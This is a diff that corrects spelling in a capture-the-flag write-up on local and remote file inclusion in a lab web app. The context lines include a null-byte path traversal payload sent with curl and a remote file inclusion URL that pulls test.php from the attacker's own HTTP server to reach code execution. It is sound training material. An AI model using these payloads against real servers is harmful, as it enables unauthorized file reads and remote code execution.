@@ -68,14 +68,14 @@ Refresh the page and we can see that we have been able to successfully view the 
 ---
 
 ## 🛠️ TASK 3: Capture Flag2 at /etc/flag3  
-Task 3 was arguably the one I spent the most time working through and via a process of elimination/trial and error I managed to get the flag. Once we load up the challange at **http://MACHINE_IP/challenges/chall3.php** we will not see anything of not such as with the two previouse tasks. So as a start lets just pop in our file path and see what is returned.  
+Task 3 was arguably the one I spent the most time working through and via a process of elimination/trial and error I managed to get the flag. Once we load up the challenge at **http://MACHINE_IP/challenges/chall3.php** we will not see anything of not such as with the two previous tasks. So as a start lets just pop in our file path and see what is returned.  
 
 Entering ```../../../../etc/flag3``` into the input form will not return our flag. But the result does contain some useful information for us. Below is the returned information.  
 ![lab3_start](./Images/lab3_start.png)  
 
-We can see from this image that there appears to be some input sanitisation occuring which has modifed our input from ```../../../../etc/flag3``` to simply ```etcflag.php``` This indicates that the web server is removing dots and slashes and also appending the input with .php indicating the developer has specified the file type to pass to the include function. We can bypass this last part via a null byte.
+We can see from this image that there appears to be some input sanitisation occurring which has modified our input from ```../../../../etc/flag3``` to simply ```etcflag.php``` This indicates that the web server is removing dots and slashes and also appending the input with .php indicating the developer has specified the file type to pass to the include function. We can bypass this last part via a null byte.
 
-After some trial and error I was still not able to find any success with the website and decided to try using Curl again ro make the request.  
+After some trial and error I was still not able to find any success with the website and decided to try using Curl again to make the request.  
 I first attempted a Curl request similar to what we used in Task 1  ```curl http://MACHINE_IP/challenges/chall1.php -X POST -d "file=../../../../etc/flag3%00" ```     
 Which returned an error messaged indication that the output needed to be passed to a fail, as such I modified my input to output the returned data into a file using the below  
 
@@ -108,11 +108,11 @@ Next we need to setup a http server in the same directory as our file which will
 
 Which would look like this  
 ![lab4_http_server](./Images/Lab4_http_server.png)  
-We now have running a http.server in our directoy which will allow us to download the test.php file from the web server.  
+We now have running a http.server in our directory which will allow us to download the test.php file from the web server.  
 
 Navigate back to the playground webpage and enter the following into the address bar  
 ```MACHINE_IP/playground.php?file=http://YOUR_MACHINE_IP:8080/test.php```  
-If done correctly we will be able to see a **GET** requested recived in our terminal with the running http server as below.  
+If done correctly we will be able to see a **GET** requested received in our terminal with the running http server as below.  
 ![Lab4_pull_requests](./Images/Lab4_pull_requests.png)
 
 And we can also confirm the test on the website where we can see the output contents of our file.
@@ -121,5 +121,3 @@ And we can also confirm the test on the website where we can see the output cont
 This confirms there is a RFI vulnerability which we can exploit to gain RCE access.  
 
 ### 🔥 Metasploit option  
-
-
